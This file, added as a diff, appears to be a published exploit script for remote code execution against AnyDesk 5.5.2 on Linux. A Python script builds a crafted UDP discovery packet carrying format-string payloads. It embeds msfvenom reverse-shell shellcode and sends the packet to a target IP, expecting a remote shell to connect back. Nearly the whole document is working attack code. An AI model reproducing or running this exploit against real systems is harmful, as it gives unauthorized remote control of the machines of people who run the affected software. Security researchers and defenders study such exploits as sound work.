@@ -1,0 +1,53 @@
+# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
+# Date: 09/06/20
+# Exploit Author: scryh
+# Vendor Homepage: https://anydesk.com/en
+# Version: 5.5.2
+# Tested on: Linux
+# Walkthrough: https://devel0pment.de/?p=1881
+ 
+#!/usr/bin/env python
+import struct
+import socket
+import sys
+ 
+ip = '10.0.6.52'
+port = 50001
+ 
+def gen_discover_packet(ad_id, os, hn, user, inf, func):
+    d  = bytes([0x3e, 0xd1, 0x1])
+    d += struct.pack('>I', ad_id)
+    d += struct.pack('>I', 0)
+    d += bytes([0x2, os])
+    d += struct.pack('>I', len(hn)) + hn.encode('latin1')
+    d += struct.pack('>I', len(user)) + user.encode('latin1')
+    d += struct.pack('>I', 0)
+    d += struct.pack('>I', len(inf)) + inf.encode('latin1')
+    d += bytes([0])
+    d += struct.pack('>I', len(func)) + func.encode('latin1')
+    d += bytes([0x2, 0xc3, 0x51])
+    return d
+ 
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
+ 
+shellcode =  b""
+shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
+shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcd\xf3\xc4"
+shellcode += b"\x64\x05\xcc\xbf\x84\x48\x31\x58\x27\x48\x2d"
+shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa7\xda\x9c\xfd\x6f"
+shellcode += b"\xce\xe0\xee\xcc\xad\xcb\x61\x4d\x5b\xf7\x3d"
+shellcode += b"\xcf\xf3\xd5\x16\x0f\xcc\xb9\xb6\x9c\xbb\x4d"
+shellcode += b"\x82\x6f\xdc\xe5\xee\xe7\xab\xcb\x61\x6f\xcf"
+shellcode += b"\xe1\xcc\x32\x3d\xae\x45\x5d\xc3\xba\xf1\x3b"
+shellcode += b"\x99\xff\x3c\x9c\x84\x04\xab\xaf\x9a\xaa\x4b"
+shellcode += b"\x76\xa4\xbf\xd7\x85\x7a\x23\x36\x52\x84\x36"
+shellcode += b"\x62\xc2\xf6\xc4\x64\x05\xcc\xbf\x84"
+ 
+shellcode_str = "".join([chr(b) for b in shellcode])  # Convert bytes to a string
+ 
+print('sending payload ...')
+p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln' + shellcode_str, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(p, (ip, port))
+s.close()
+print('reverse shell should connect within 5 seconds')
